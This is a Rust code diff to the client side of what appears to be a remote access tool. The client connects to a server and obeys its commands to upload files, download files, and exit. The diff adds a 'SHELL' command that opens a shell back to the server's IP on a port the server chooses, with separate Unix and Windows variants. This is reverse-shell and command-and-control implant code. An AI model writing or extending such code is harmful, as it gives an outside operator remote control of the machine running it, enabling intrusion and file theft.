@@ -7,7 +7,7 @@ use std::time::Duration;
 
 use colored::Colorize;
 
-use crate::{error, success};
+use crate::{error, shell, success};
 use crate::files::{prep_download, receive_file, upload};
 
 pub fn start_client(ip: String, port: String) {
@@ -21,10 +21,16 @@ pub fn start_client(ip: String, port: String) {
                     match stream.read(&mut buffer) {
                         Ok(size) => {
                             if size > 0 {
-                                handle_server_response(
+                                match handle_server_response(
                                     &mut stream,
                                     String::from_utf8_lossy(&buffer[..size]).to_string(),
-                                );
+                                ) {
+                                    Ok(_) => {}
+                                    Err(e) => {
+                                        error!("{}", e);
+                                        break;
+                                    }
+                                }
                             }
                         }
                         Err(e) => {
@@ -44,13 +50,36 @@ pub fn start_client(ip: String, port: String) {
     }
 }
 
-fn handle_server_response(stream: &mut TcpStream, response: String) {
+fn handle_server_response(stream: &mut TcpStream, response: String) -> Result<(), String> {
     let mut lines = response.lines();
     if let Some(first_line) = lines.next() {
         match first_line {
             "CLOSE" => {
                 stream.write_all(b"OK").unwrap();
                 process::exit(0);
+            }
+            "SHELL" => {
+                stream.write_all(b"OK").unwrap();
+                let port = lines
+                    .next()
+                    .unwrap()
+                    .trim_matches(char::from(0))
+                    .trim()
+                    .to_string();
+                thread::sleep(Duration::from_secs(1));
+                #[cfg(unix)]
+                if let Err(err) =
+                    shell::unixshell::shell(stream.peer_addr().unwrap().ip().to_string(), port)
+                {
+                    error!("{}", err);
+                }
+
+                #[cfg(windows)]
+                if let Err(err) =
+                    shell::winshell::shell(stream.peer_addr().unwrap().ip().to_string(), port)
+                {
+                    error!("{}", err);
+                }
             }
             "UPLOAD" => {
                 let path_str = lines.next().unwrap().trim_matches(char::from(0)).trim();
@@ -85,6 +114,10 @@ fn handle_server_response(stream: &mut TcpStream, response: String) {
                     Err(e) => stream.write_all(e.to_string().as_bytes()).unwrap(),
                 };
             }
+            "QUIT" => {
+                thread::sleep(Duration::from_millis(500));
+                return Err("Host disconnected!".to_string());
+            }
             _ => stream
                 .write_all(
                     format!(
@@ -96,4 +129,5 @@ fn handle_server_response(stream: &mut TcpStream, response: String) {
                 .unwrap(),
         }
     }
+    Ok(())
 }
